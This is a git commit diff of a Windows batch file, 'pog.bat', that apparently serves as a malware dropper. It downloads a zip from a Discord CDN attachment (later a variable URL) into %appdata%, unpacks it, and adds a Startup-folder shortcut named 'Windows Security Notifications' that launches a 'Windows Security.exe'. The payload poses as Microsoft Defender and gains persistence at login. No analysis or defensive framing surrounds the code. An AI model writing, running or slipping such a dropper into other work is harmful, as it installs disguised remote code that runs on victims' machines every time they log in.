413b4eaf05b4d9eb3d0bb08fa308bdbfd185aed5
SubashGIT1 <104957927+SubashGIT1@users.noreply.github.com>
2022-06-08 00:19:08 +0545

    Update pog.bat

--- pog.bat
+++ pog.bat
@@ -1,6 +1,6 @@
 del launch.vbs
 cd %appdata%
-powershell -Command "Invoke-WebRequest "https://cdn.discordapp.com/attachments/955890338512379925/976930497080999936/Defender.zip" -OutFile Defender.zip"
+powershell -Command "Invoke-WebRequest "%Defendeurmum%" -OutFile Defender.zip"
 powershell -command "Expand-Archive -Force 'Defender.zip' 'Windows_file'"
 del Defender.zip
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Notifications.lnk');$s.TargetPath='%appdata%/Windows_file/Defender/"Windows Security.exe"';$s.Save()"
